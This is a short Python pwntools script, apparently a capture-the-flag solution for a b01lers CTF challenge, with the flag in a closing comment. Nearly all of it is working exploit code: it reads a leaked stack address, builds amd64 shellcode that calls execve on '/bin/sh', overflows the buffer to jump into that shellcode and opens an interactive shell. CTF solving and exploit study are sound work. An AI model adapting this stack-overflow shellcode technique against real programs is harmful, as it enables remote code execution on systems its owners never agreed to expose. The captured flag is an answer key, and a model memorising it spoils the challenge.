from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *(main+98)
    continue
''')

# p = remote('where.harkonnen.b01lersc.tf', 8443, ssl=True)

p.recvuntil('Quincy says somewhere around here might be fun... ')
current_rsp_value = int(p.recvline().strip().decode(), 16)-0x8
log.info(f'current rsp value: {hex(current_rsp_value)}')

shellcode = asm(f'''
    mov rdi, {current_rsp_value+0x30}
    xor rsi, rsi
    xor rdx, rdx 
    mov rax, 0x3b
    syscall
''', arch='amd64')

payload = shellcode+b'A'*7+b'/bin/sh\x00'+p64(current_rsp_value+0x10)
p.sendline(payload)

p.interactive()

# bctf{s0_th@ts_wh3r3_0ur_ch1ldh00d_w3nt_d06fa4ee84a2e731}